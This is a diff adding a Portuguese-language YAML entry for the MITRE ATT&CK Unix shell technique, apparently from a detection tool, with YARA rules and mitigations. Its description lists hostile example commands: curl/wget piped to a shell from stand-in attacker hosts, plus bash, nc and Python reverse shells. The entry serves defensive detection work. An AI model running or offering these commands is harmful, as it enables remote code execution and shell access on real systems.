@@ -1,0 +1,38 @@
+id: T1059.004
+name: Command and Scripting Interpreter - Unix Shell
+tactic: Execution (Execução)
+url: https://attack.mitre.org/techniques/T1059/004/
+severity: high
+description: |
+  Atacante executa comandos via shell (bash, sh, zsh) pra rodar payloads
+  arbitrários. Anti-padrões clássicos:
+
+    curl https://attacker.com/x.sh | bash    # download direto pra shell
+    wget -O- http://evil.io/y | sh           # mesmo, com wget
+    bash -i >& /dev/tcp/1.2.3.4/4444 0>&1    # reverse shell
+    nc -e /bin/sh attacker.com 9999          # nc reverse shell
+    python -c 'import socket,os,...'         # python reverse shell
+
+  Esses padrões aparecem em:
+  - Scripts pós-exploit pós-RCE
+  - Tutoriais sketchy de "instale meu projeto" (engenharia social)
+  - Backdoors persistentes em cron/systemd
+
+detection:
+  rules:
+    - yara_critical_match
+    - yara_match_burst
+  signals: |
+    YARA matches em scripts shell com SuspiciousCurlBash ou ReverseShellPattern.
+    Em vuln-lab tem exemplo em /tmp/lab-bait/install.sh.
+
+mitigation:
+  - Não executar curl|bash de fontes não-confiáveis (baixar, ler, AÍ executar)
+  - Auditd registrando execve com argv (audit-userspace + ausearch)
+  - SELinux com contexto restrito pra usuários web (httpd_t não pode exec /bin/bash)
+  - Egress firewall: bloquear curl/wget pra IPs não-whitelisted em servidores
+  - SentinelBR YARA scan periódico em /tmp e /var/www
+
+references:
+  - https://attack.mitre.org/techniques/T1059/004/
+  - https://gtfobins.github.io (catalogo de binarios usados pra abuse)
